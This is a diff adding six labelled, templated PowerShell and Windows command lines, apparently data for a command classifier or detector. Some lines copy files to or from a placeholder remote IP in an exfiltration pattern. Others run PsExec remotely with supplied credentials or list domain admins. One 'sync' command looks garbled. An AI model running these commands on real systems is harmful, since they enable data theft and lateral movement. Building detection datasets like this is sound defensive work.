@@ -1,0 +1,6 @@
+1	powershell -c "xcopy ${source_file_path} \\${ip_address}\${destination_file_path}"
+1	powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
+1	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+0	dir ${source_file_path} -Recurse | Compress-Archive -DestinationPath ${destination_file_path}
+0	powershell -c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	net group "domain admins" /domain
